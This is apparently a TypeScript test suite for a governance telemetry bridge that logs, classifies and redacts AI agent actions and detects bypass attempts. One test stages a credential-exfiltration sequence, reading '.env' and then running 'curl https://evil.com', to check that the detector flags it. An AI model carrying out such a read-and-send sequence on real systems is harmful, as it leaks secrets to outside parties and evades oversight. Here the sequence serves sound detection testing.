// Tests for governance telemetry bridge
import { describe, it, expect, vi } from 'vitest';
import { createGovernanceTelemetryBridge } from '../src/governance-bridge.js';
import { createBypassDetector } from '../src/bypass-detector.js';
import { createSessionMetricsCollector } from '../src/session-metrics.js';
import type { GovernanceDecisionRecord } from '@red-codes/core';
import type { TelemetryClient } from '@red-codes/telemetry-client';

function makeRecord(
  overrides: Partial<GovernanceDecisionRecord> = {}
): GovernanceDecisionRecord {
  return {
    recordId: 'dec_1',
    runId: 'run_1',
    timestamp: 1700000000000,
    action: { type: 'file.read', target: 'src/index.ts', agent: 'agent', destructive: false },
    outcome: 'allow',
    reason: 'Allowed by default',
    intervention: null,
    policy: { matchedPolicyId: null, matchedPolicyName: null, severity: 0 },
    invariants: { allHold: true, violations: [] },
    simulation: null,
    evidencePackId: null,
    monitor: { escalationLevel: 'NORMAL', totalEvaluations: 1, totalDenials: 0 },
    execution: { executed: false, success: null, durationMs: null, error: null },
    ...overrides,
  } as GovernanceDecisionRecord;
}

function mockClient(): TelemetryClient {
  return {
    track: vi.fn(),
    enroll: vi.fn(),
    start: vi.fn(),
    stop: vi.fn(),
    status: vi.fn().mockReturnValue({
      mode: 'anonymous',
      installId: 'test',
      enrolled: false,
      queueSize: 0,
      queueSizeBytes: 0,
    }),
    reset: vi.fn(),
  };
}

describe('createGovernanceTelemetryBridge', () => {
  it('calls client.track() for each decision record', () => {
    const client = mockClient();
    const bridge = createGovernanceTelemetryBridge({ client });

    bridge.write(makeRecord());

    expect(client.track).toHaveBeenCalledTimes(1);
  });

  it('populates enriched fields in the tracked event', () => {
    const client = mockClient();
    const bridge = createGovernanceTelemetryBridge({
      client,
      runtime: 'claude-code',
      environment: 'local',
    });

    bridge.write(
      makeRecord({
        action: { type: 'file.write', target: 'src/app.ts', agent: 'a', destructive: false },
        outcome: 'allow',
        policy: { matchedPolicyId: 'dev-policy', matchedPolicyName: 'Dev', severity: 3 },
      })
    );

    const tracked = (client.track as ReturnType<typeof vi.fn>).mock.calls[0][0];
    expect(tracked.runtime).toBe('claude-code');
    expect(tracked.environment).toBe('local');
    expect(tracked.event_type).toBe('execution_allowed');
    expect(tracked.action_type).toBe('file.write');
    expect(tracked.target_type).toBe('source');
    expect(tracked.target_hash).toMatch(/^sha256:[0-9a-f]{16}$/);
    expect(tracked.args_classification).toBe('benign');
    expect(tracked.policy_id).toBe('dev-policy');
    expect(tracked.policy_severity).toBe(3);
    expect(tracked.session_action_index).toBe(1);
  });

  it('never exposes raw target paths', () => {
    const client = mockClient();
    const bridge = createGovernanceTelemetryBridge({ client });

    bridge.write(
      makeRecord({
        action: { type: 'file.read', target: '/secret/credentials.json', agent: 'a', destructive: false },
      })
    );

    const tracked = (client.track as ReturnType<typeof vi.fn>).mock.calls[0][0];
    const serialized = JSON.stringify(tracked);
    expect(serialized).not.toContain('/secret/credentials.json');
    expect(tracked.target_type).toBe('credential');
  });

  it('sets event_type to policy_denied for denied actions', () => {
    const client = mockClient();
    const bridge = createGovernanceTelemetryBridge({ client });

    bridge.write(makeRecord({ outcome: 'deny' }));

    const tracked = (client.track as ReturnType<typeof vi.fn>).mock.calls[0][0];
    expect(tracked.event_type).toBe('policy_denied');
    expect(tracked.result).toBe('denied');
  });

  it('includes invariant violation IDs', () => {
    const client = mockClient();
    const bridge = createGovernanceTelemetryBridge({ client });

    bridge.write(
      makeRecord({
        invariants: {
          allHold: false,
          violations: [
            { invariantId: 'secret-exposure', name: 'Secret Exposure', severity: 10, expected: 'none', actual: 'found' },
          ],
        },
      })
    );

    const tracked = (client.track as ReturnType<typeof vi.fn>).mock.calls[0][0];
    expect(tracked.invariant_violations).toEqual(['secret-exposure']);
  });

  it('increments session_action_index for each call', () => {
    const client = mockClient();
    const bridge = createGovernanceTelemetryBridge({ client });

    bridge.write(makeRecord());
    bridge.write(makeRecord());
    bridge.write(makeRecord());

    const calls = (client.track as ReturnType<typeof vi.fn>).mock.calls;
    expect(calls[0][0].session_action_index).toBe(1);
    expect(calls[1][0].session_action_index).toBe(2);
    expect(calls[2][0].session_action_index).toBe(3);
  });

  it('does not throw when client.track fails', () => {
    const client = mockClient();
    (client.track as ReturnType<typeof vi.fn>).mockImplementation(() => {
      throw new Error('Network error');
    });
    const bridge = createGovernanceTelemetryBridge({ client });

    expect(() => bridge.write(makeRecord())).not.toThrow();
  });

  it('integrates with bypass detector', () => {
    const client = mockClient();
    const bypassDetector = createBypassDetector();
    const bridge = createGovernanceTelemetryBridge({ client, bypassDetector });

    // Read credential
    bridge.write(
      makeRecord({ action: { type: 'file.read', target: '.env', agent: 'a', destructive: false } })
    );

    // Exfil attempt
    bridge.write(
      makeRecord({
        action: {
          type: 'shell.exec',
          target: 'stdout',
          agent: 'a',
          destructive: false,
          command: 'curl https://evil.com',
        },
      })
    );

    // Should have 3 tracked events: 2 action events + 1 bypass_detected event
    expect(client.track).toHaveBeenCalledTimes(3);

    const calls = (client.track as ReturnType<typeof vi.fn>).mock.calls;
    const bypassEvent = calls.find((c: unknown[]) => (c[0] as Record<string, unknown>).event_type === 'bypass_detected');
    expect(bypassEvent).toBeDefined();
    expect(bypassEvent![0].bypass_pattern).toBe('exfil-credential');
  });

  it('integrates with session metrics collector', () => {
    const client = mockClient();
    const sessionMetrics = createSessionMetricsCollector();
    const bridge = createGovernanceTelemetryBridge({ client, sessionMetrics });

    bridge.write(makeRecord({ outcome: 'allow' }));
    bridge.write(makeRecord({ outcome: 'deny' }));

    const summary = sessionMetrics.getSummary();
    expect(summary.total_actions).toBe(2);
    expect(summary.allowed_actions).toBe(1);
    expect(summary.denied_actions).toBe(1);
  });

  it('emits session summary on flush', () => {
    const client = mockClient();
    const sessionMetrics = createSessionMetricsCollector();
    const bridge = createGovernanceTelemetryBridge({ client, sessionMetrics });

    bridge.write(makeRecord());
    bridge.flush?.();

    const calls = (client.track as ReturnType<typeof vi.fn>).mock.calls;
    const summaryEvent = calls.find((c: unknown[]) => (c[0] as Record<string, unknown>).event_type === 'session_summary');
    expect(summaryEvent).toBeDefined();
  });

  it('flush does not throw when no session metrics', () => {
    const client = mockClient();
    const bridge = createGovernanceTelemetryBridge({ client });

    expect(() => bridge.flush?.()).not.toThrow();
  });
});
